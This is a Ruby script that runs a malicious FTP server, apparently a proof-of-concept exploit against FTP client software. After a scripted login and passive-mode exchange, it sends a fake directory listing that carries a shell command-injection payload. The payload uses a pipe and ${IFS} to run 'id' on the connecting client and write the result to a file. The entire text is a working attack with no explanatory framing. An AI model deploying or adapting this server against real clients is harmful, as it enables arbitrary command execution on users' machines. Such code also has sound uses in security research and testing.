require 'socket'
host = '172.20.0.3'
port = 2121
hostsplit = host.tr('.',',')

server = TCPServer.new port

loop do
  Thread.start(server.accept) do |client|
    client.puts "220 Attack FTP\r\n"
    r = client.gets
	puts r
	client.puts "331 password please - version check\r\n"	
    r = client.gets
	puts r
	client.puts "230 User logged in\r\n"
    r = client.gets
	puts r
	client.puts "230 more data please!\r\n"	
    r = client.gets
	puts r
	client.puts "230 more data please!\r\n"	
    r = client.gets
	puts r

	wait = true
    psv = Thread.new do
		pserver = TCPServer.new 23461
		Thread.start(pserver.accept) do |pclient|
            while wait do
            end
			pclient.puts "|echo${IFS}$(id)${IFS}>pang\r\n"
			pclient.close
		end
    end

    sleep 1

	client.puts "227 Entering Passive Mode ("+hostsplit+",91,165)\r\n"
    r = client.gets
	puts r

    psv.join

	client.puts "150 Here comes the directory listing.\r\n"
    
    wait = false

	client.puts "226 Directory send OK.\r\n"
    r = client.gets
	puts r
	client.puts "221 goodbye\r\n"	
    client.close
  end
end